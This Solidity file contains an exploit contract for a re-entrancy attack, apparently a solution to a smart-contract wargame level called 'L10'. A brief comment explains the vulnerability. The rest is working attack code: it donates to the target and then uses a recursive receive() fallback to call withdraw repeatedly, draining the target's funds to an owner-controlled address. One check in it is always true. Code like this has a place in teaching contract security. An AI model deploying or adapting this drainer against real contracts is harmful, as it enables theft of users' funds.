// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

/** Re-entrancy hack is a common vulnerability due to which multiple exploits
	have been successful. In L10 contract, we can see transfer of funds happening before effects of the transactions are set in the contract. This gives any shady
	contract power to invoke malicious fallback functions to call `withdraw`
	function in a recursive manner and drain the contract from all funds.
 */

interface Reentrance {
  	function donate(address _to) external payable;
    function withdraw(uint _amount) external;
	function balanceOf(address _who) external view returns (uint balance);
}

contract ReEntrancyHack {
	address private _owner;
    uint256 public donatedAmount;
    Reentrance r;

	constructor(address payable reentranceAdd) payable {
		_owner = msg.sender;
		r = Reentrance(reentranceAdd);
        donatedAmount = msg.value;
        r.donate{value: msg.value}(address(this));

		withdrawHack();
	}

	function withdraw() public payable {
        require(msg.sender == _owner);
        _owner.call{value: donatedAmount}("");
    }

	function withdrawHack() public {
		r.withdraw(donatedAmount);
	}

	receive() external payable {
        if (address(r).balance >= 0) {
			uint256 am = donatedAmount < address(r).balance ? donatedAmount : address(r).balance;
        	r.withdraw(am);
		}
    }
}